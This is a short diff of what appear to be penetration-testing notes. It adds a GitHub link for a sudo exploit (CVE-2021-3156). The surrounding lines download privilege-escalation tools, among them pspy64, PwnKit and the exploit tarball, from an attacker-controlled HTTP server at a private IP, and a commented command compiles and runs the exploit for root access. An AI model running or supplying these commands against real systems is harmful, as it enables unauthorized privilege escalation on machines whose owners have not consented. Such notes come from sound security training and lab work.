@@ -24,6 +24,7 @@ wget http://192.168.45.200:8000/inpeas.sh
 wget http://192.168.45.200:8000/pspy64
 wget http://192.168.45.200:8000/PwnKit
 wget http://192.168.45.200:8000/CVE-2021-3156.tar
+# https://github.com/blasty/CVE-2021-3156
 # tar xvf CVE-2021-3156.tar && cd CVE-2021-3156 && make && ./sudo-hax-me-a-sandwich
 ```
 
